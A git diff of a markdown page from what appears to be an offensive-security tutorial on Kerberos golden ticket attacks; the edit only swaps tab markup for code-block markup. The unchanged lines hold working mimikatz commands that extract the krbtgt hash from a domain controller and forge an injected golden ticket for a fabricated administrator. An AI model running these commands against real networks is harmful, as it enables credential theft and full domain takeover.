@@ -12,25 +12,21 @@ This attack assumes a Domain Controller compromise where `KRBTGT` account hash w
 
 Extracting the krbtgt account's password `NTLM` hash:
 
-{% tabs %}
-{% tab title="attacker@victim-dc" %}
+{% code title="attacker@victim-dc" %}
 ```csharp
 mimikatz # lsadump::lsa /inject /name:krbtgt
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberos-golden-krbtgt-hash.png)
 
 Creating a forged golden ticket that automatically gets injected in current logon session's memory:
 
-{% tabs %}
-{% tab title="attacker@victim-workstation" %}
+{% code title="attacker@victim-workstation" %}
 ```text
 mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/kerberos-golden-create.png)
 
